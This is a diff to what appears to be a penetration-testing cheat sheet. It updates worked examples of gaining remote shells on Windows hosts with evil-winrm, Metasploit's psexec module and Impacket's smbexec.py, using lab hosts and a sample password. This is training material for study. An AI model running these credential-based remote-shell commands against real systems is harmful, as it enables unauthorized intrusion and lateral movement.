@@ -3,7 +3,7 @@
 ### evil-winrm
 evil-winrm
 ```
-$ evil-winrm -u ryan -p Password123 -i example.htb
+$ evil-winrm -i example.htb -u ryan -p Password123
                                         
 Evil-WinRM shell v3.5
                                         
@@ -13,6 +13,19 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\ryan\Documents>
+```
+example 2:
+```
+$ evil-winrm -i 10.129.241.38 -u emily -p Password123
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
 ```
 ### psexec.py
 psexec.py
@@ -51,7 +64,7 @@ Module options (exploit/windows/smb/psexec):
    SERVICE_DISPLAY_NAME                   no        The service display name
    SERVICE_NAME                           no        The service name
    SMBDomain             .                no        The Windows domain to use for authentication
-   SMBPass               abc_123321!@#    no        The password for the specified username
+   SMBPass               Password123      no        The password for the specified username
    SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
    SMBUser               Administrator    no        The username to authenticate as
 
@@ -87,7 +100,7 @@ meterpreter >
 ### smbexec.py
 smbexec.py
 ```
-root@attackdefense:~# smbexec.py Administrator:'abc_123321!@#'@example.local
+root@attackdefense:~# smbexec.py Administrator:'Password123'@example.local
 Impacket v0.9.25.dev1+20220131.200424.badf09d - Copyright 2021 SecureAuth Corporation
 
 [!] Launching semi-interactive shell - Careful what you execute
